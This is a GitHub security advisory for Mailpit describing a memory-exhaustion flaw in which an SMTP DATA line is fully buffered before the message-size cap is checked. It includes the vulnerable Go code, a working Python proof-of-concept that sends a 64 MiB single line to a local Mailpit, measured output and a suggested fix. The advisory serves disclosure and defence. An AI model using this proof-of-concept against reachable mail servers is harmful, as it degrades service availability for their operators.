# [M] Mailpit: SMTP DATA line reader buffers over-limit input before size enforcement

## Summary
Severity: Medium
Advisory: GHSA-r553-m4fv-5v97
CVE: CVE-2026-67447
CWE: CWE-770
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2026-08-20
Source: https://github.com/advisories/GHSA-r553-m4fv-5v97
Type: github-advisory

## Affected
- Go: `github.com/axllent/mailpit` — affected >=1.30.0 <1.30.5

## Details
## Summary

Mailpit's SMTP DATA reader enforces the configured `MaxMessageSize` only after `bufio.Reader.ReadBytes('\n')` has already buffered a complete DATA line. A remote unauthenticated SMTP client can send one line larger than the configured message-size cap and force memory allocation before Mailpit returns the expected `552 5.3.4` rejection, leaving patched versions still exposed to a single-line incomplete-fix variant of the earlier SMTP DATA body-size issue.

## Technical Details

Mailpit enables SMTP by default. The SMTP server now wires `config.MaxMessageSize` into `srv.MaxSize`:

```go
if config.MaxMessageSize > 0 {
    srv.MaxSize = config.MaxMessageSize * 1024 * 1024
}
```

The DATA reader then checks that cap, but only after reading a full newline-terminated line into memory:

```go
line, err := s.br.ReadBytes('\n')
if err != nil {
    return nil, err
}

if bytes.Equal(line, []byte(".\r\n")) {
    break
}
if line[0] == '.' {
    line = line[1:]
}

if s.srv.MaxSize > 0 {
    if len(data)+len(line) > s.srv.MaxSize {
        _, _ = s.br.Discard(s.br.Buffered())
        return nil, maxSizeExceeded(s.srv.MaxSize)
    }
}
```

This ordering violates the size-limit invariant. The configured cap can reject the message only after the attacker has supplied the line terminator and `ReadBytes('\n')` has allocated the over-limit line. With the default 50 MiB cap, a 64 MiB single DATA line is still buffered before Mailpit returns `552 5.3.4 Requested mail action aborted: exceeded storage allocation (52428800)`.

This is related to the older SMTP DATA body-size advisory, but it is a post-fix gap: `srv.MaxSize` is now assigned, and normal multi-line DATA accumulation is bounded. The remaining issue is that one individual DATA line is not bounded before buffering.

## PoV

The following reduced proof starts a local Mailpit release binary, sends a small DATA message as a negative control, then sends one 64 MiB DATA line without an intermediate newline. It samples process RSS while the request is in flight:

```python
#!/usr/bin/env python3
import os, socket, subprocess, threading, time
from pathlib import Path

def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p

def rss_kib(pid):
    return int(subprocess.check_output(["ps", "-o", "rss=", "-p", str(pid)], text=True).strip())

def recv_line(sock):
    data = b""
    while not data.endswith(b"\n"):
        chunk = sock.recv(1)
        if not chunk:
            break
        data += chunk
    return data.decode("latin-1", "replace").strip()

def send_cmd(sock, cmd):
    sock.sendall(cmd)
    return recv_line(sock)

def wait_for_smtp(port):
    deadline = time.time() + 8
    while time.time() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.5) as sock:
                recv_line(sock)
                return
        except OSError:
            time.sleep(0.1)
    raise RuntimeError("SMTP server did not become ready")

def send_data_line(port, pid, label, payload_bytes, finish_message):
    stop = threading.Event()
    peak = {"rss": rss_kib(pid)}
    def monitor():
        while not stop.is_set():
            peak["rss"] = max(peak["rss"], rss_kib(pid))
            time.sleep(0.03)
    t = threading.Thread(target=monitor, daemon=True)
    t.start()
    sock = socket.create_connection(("127.0.0.1", port), timeout=20)
    try:
        recv_line(sock)
        send_cmd(sock, b"HELO pov.example\r\n")
        send_cmd(sock, b"MAIL FROM:<sender@example.test>\r\n")
        send_cmd(sock, b"RCPT TO:<recipient@example.test>\r\n")
        send_cmd(sock, b"DATA\r\n")
        sock.sendall(f"Subject: {label}\r\n\r\n".encode())
        chunk = b"A" * min(1024 * 1024, payload_bytes)
        remaining = payload_bytes
        while remaining:
            n = min(len(chunk), remaining)
            sock.sendall(chunk[:n])
            remaining -= n
        sock.sendall(b"\r\n.\r\n" if finish_message else b"\r\n")
        response = recv_line(sock)
    finally:
        stop.set()
        t.join(timeout=1)
        sock.close()
    after = rss_kib(pid)
    return response, max(peak["rss"], after), after

mailpit = "./mailpit"
workdir = Path("./pov-work")
workdir.mkdir(exist_ok=True)
http_port, smtp_port = free_port(), free_port()
proc = subprocess.Popen([mailpit, "--disable-version-check", "--database", str(workdir / "mailpit.db"), "--listen", f"127.0.0.1:{http_port}", "--smtp", f"127.0.0.1:{smtp_port}", "--max-message-size", "50"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=os.environ.copy())
try:
    wait_for_smtp(smtp_port)
    time.sleep(0.25)
    max_message_size_mib = 50
    control_payload = 1024
    oversized_payload = 64 * 1024 * 1024
    baseline = rss_kib(proc.pid)
    control_resp, control_peak, after_control = send_data_line(smtp_port, proc.pid, "negative-control", control_payload, True)
    oversized_resp, oversized_peak, after_oversized = send_data_line(smtp_port, proc.pid, "oversized-single-line", oversized_payload, False)
    print(f"max_message_size_mib={max_message_size_mib}")
    print(f"baseline_rss_kib={baseline}")
    print(f"control_payload_bytes={control_payload}")
    print(f"control_response={control_resp}")
    print(f"control_peak_delta_kib={control_peak - baseline}")
    print(f"after_control_rss_kib={after_control}")
    print(f"oversized_single_data_line_bytes={oversized_payload}")
    print(f"oversized_response={oversized_resp}")
    print(f"oversized_peak_delta_kib={oversized_peak - after_control}")
    print(f"after_oversized_rss_kib={after_oversized}")
finally:
    proc.terminate()
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()
```

## PoC

For the official Darwin ARM64 `v1.30.3` release binary used for this proof, start in a clean parent directory and create the PoC directory:

```fish
mkdir mailpit-v1.30.3-pov
cd mailpit-v1.30.3-pov
```

From inside that directory, save the script above as `smtp_data_line_size_pov.py`, then run:

```fish
curl -fsSLO https://github.com/axllent/mailpit/releases/download/v1.30.3/mailpit-darwin-arm64.tar.gz
tar -xzf mailpit-darwin-arm64.tar.gz
chmod +x ./mailpit
./mailpit version
python3 ./smtp_data_line_size_pov.py
```

The official Darwin ARM64 `v1.30.3` release binary reported:

```text
mailpit v1.30.3 compiled with go1.26.4 on darwin/arm64
```

The bounded PoC output was:

```text
max_message_size_mib=50
baseline_rss_kib=25008
control_payload_bytes=1024
control_response=250 2.0.0 Ok: queued as 1702Ad5k2J9kgOrc6phO0X
control_peak_delta_kib=2656
after_control_rss_kib=27680
oversized_single_data_line_bytes=67108864
oversized_response=552 5.3.4 Requested mail action aborted: exceeded storage allocation (52428800)
oversized_peak_delta_kib=132928
after_oversized_rss_kib=160608
```

The control shows the normal DATA path accepting and queueing a small message. The oversized case differs only in DATA line length: Mailpit returns the configured size-cap rejection, but only after process RSS rises by about 130 MiB for one 64 MiB line.

## Impact

An unauthenticated client that can reach the SMTP listener can force Mailpit to allocate memory above the configured `MaxMessageSize` before rejection. Repeating the input across concurrent connections can create substantial memory pressure and degrade service availability. The issue is bounded by attacker bandwidth and host memory rather than by the configured message-size cap until a newline arrives and the delayed check runs.

Exploitability requires the SMTP listener to be reachable by an untrusted client. Typical Mailpit deployments confined to trusted internal networks, CI environments without untrusted SMTP access, or loopback-only access therefore have substantially lower practical risk. `AV:N` describes the network attack path in a reachable deployment; it does not imply that most Mailpit instances are exposed to the public Internet.

The PoV demonstrates substantial memory pressure but does not establish complete service loss. The advisory therefore uses Low availability impact (`A:L`), producing a CVSS 3.1 score of 5.3 (Medium).

## Suggested Fix

Bound SMTP DATA line reads before buffering the full line. Replace unbounded `ReadBytes('\n')` with a reader that stops once `len(data)+currentLineBytes` would exceed `srv.MaxSize`, returns the existing `552 5.3.4` error, and drains or closes the connection without retaining the over-limit line. The check should account for dot-stuffing and the CRLF terminator, and should reject before allocating attacker-controlled bytes beyond the configured cap.

Regression tests should cover a normal small DATA message, a multi-line message exactly at the cap, and a single line over the cap. The over-cap single-line test should assert that Mailpit returns `552 5.3.4` without reading the whole line into a returned buffer or causing material RSS growth.

## Affected Package/Versions

Confirmed affected:

- `v1.30.0`, commit `af8756a32cf7ecf06bef109c1348b783f1a239ee`, source has the post-fix `srv.MaxSize` wiring and the same `ReadBytes('\n')` before size enforcement.
- `v1.30.3`, commit `6acf5b8f942ab0e007b1227d31dfb3c3303e8d13`, reproduces with the official Darwin ARM64 binary shown above.
- Latest release `v1.30.4`, commit `3b41030dbef4574ec92b815cb464fec7b4cfdc15`, published 2026-07-09, is source-confirmed with the same vulnerable ordering.
- Current `develop`, commit `6a09f28d5489a85245cc8ddbf512047495627147`, checked 2026-07-09, is source-confirmed with the same vulnerable ordering.

No fixed version was identified during this review.

A focused source sweep on 2026-07-09 returned the same ordering for the lower post-fix release, latest release, and current `develop`: `internal/smtpd/main.go` wires `MaxMessageSize` into `srv.MaxSize`, while `internal/smtpd/smtpd.go` still reads a full DATA line before enforcing that cap.

```text
develop_head=6a09f28d5489a85245cc8ddbf512047495627147
v1.30.4_commit=3b41030dbef4574ec92b815cb464fec7b4cfdc15
v1.30.0_commit=af8756a32cf7ecf06bef109c1348b783f1a239ee

v1.30.0:internal/smtpd/main.go:250:	if config.MaxMessageSize > 0 {
v1.30.0:internal/smtpd/main.go:251:		srv.MaxSize = config.MaxMessageSize * 1024 * 1024
v1.30.0:internal/smtpd/smtpd.go:855:		line, err := s.br.ReadBytes('\n')
v1.30.0:internal/smtpd/smtpd.go:869:		if s.srv.MaxSize > 0 {
v1.30.0:internal/smtpd/smtpd.go:870:			if len(data)+len(line) > s.srv.MaxSize {
v1.30.0:internal/smtpd/smtpd.go:872:				return nil, maxSizeExceeded(s.srv.MaxSize)

v1.30.4:internal/smtpd/main.go:250:	if config.MaxMessageSize > 0 {
v1.30.4:internal/smtpd/main.go:251:		srv.MaxSize = config.MaxMessageSize * 1024 * 1024
v1.30.4:internal/smtpd/smtpd.go:878:		line, err := s.br.ReadBytes('\n')
v1.30.4:internal/smtpd/smtpd.go:892:		if s.srv.MaxSize > 0 {
v1.30.4:internal/smtpd/smtpd.go:893:			if len(data)+len(line) > s.srv.MaxSize {
v1.30.4:internal/smtpd/smtpd.go:895:				return nil, maxSizeExceeded(s.srv.MaxSize)

develop:internal/smtpd/main.go:250:	if config.MaxMessageSize > 0 {
develop:internal/smtpd/main.go:251:		srv.MaxSize = config.MaxMessageSize * 1024 * 1024
develop:internal/smtpd/smtpd.go:878:		line, err := s.br.ReadBytes('\n')
develop:internal/smtpd/smtpd.go:892:		if s.srv.MaxSize > 0 {
develop:internal/smtpd/smtpd.go:893:			if len(data)+len(line) > s.srv.MaxSize {
develop:internal/smtpd/smtpd.go:895:				return nil, maxSizeExceeded(s.srv.MaxSize)
```

## Advisory History

The closest public advisory is `GHSA-fpxj-m5q8-fphw`, "Unauthenticated remote memory-exhaustion DoS via unlimited SMTP DATA and /api/v1/send body sizes." That advisory covered older versions where `Server.MaxSize` was not assigned, leaving SMTP DATA bodies unlimited. This report is the post-fix single-line gap: `MaxSize` is assigned and the message is eventually rejected, but one over-limit DATA line is still buffered before the cap runs.

Other published Mailpit advisories checked include `GHSA-28pq-6qxg-wg5r` for sibling HTTP JSON body limits, `GHSA-54wq-72mp-cq7c` for SMTP header injection, `GHSA-w4vj-r5pg-3722` for proxy CSS map concurrency, `GHSA-qx5x-85p8-vg4j` for dump path traversal, the SSRF/link-check/proxy/html-check family, and `GHSA-524m-q5m7-79mm` for CSWSH. None describe this post-fix SMTP DATA line-buffering behavior.

`GHSA-w878-pj84-3j5v` and `GHSA-75mr-qw9x-3r39` were published on 2026-07-09 and included in the `v1.30.4` security release. `GHSA-w878-pj84-3j5v` caps SMTP command lines before `DATA` and POP3 command lines before message retrieval. It remains distinct from this post-DATA path: `v1.30.4` still calls `ReadBytes('\n')` in `readData()` before comparing the complete line against `MaxSize`. `GHSA-75mr-qw9x-3r39` bounds decoded thumbnail dimensions in the HTTP attachment handler, with a different boundary, sink, precondition, and fix surface.

The separate POP3 command-line draft was rejected and removed after `GHSA-w878-pj84-3j5v` and the `v1.30.4` release established that the shared command-line fix covers both SMTP and POP3. That disposition does not cover this report: the affected path is SMTP `readData()` after `DATA`, remains present in `v1.30.4`, and requires a remaining-message or DATA-line bound rather than a command-reader cap.

Public issue searches for `SMTP DATA line size` and `ReadBytes DATA MaxSize` returned no matching issues. Public commit search for `MaxSize ReadBytes` returned no matching fix.

## References
- https://github.com/axllent/mailpit/security/advisories/GHSA-r553-m4fv-5v97
- https://github.com/axllent/mailpit/commit/8720c6bd8281fc00d458081908f1dbef8e59a98c
- https://github.com/axllent/mailpit
- https://github.com/axllent/mailpit/releases/tag/v1.30.5
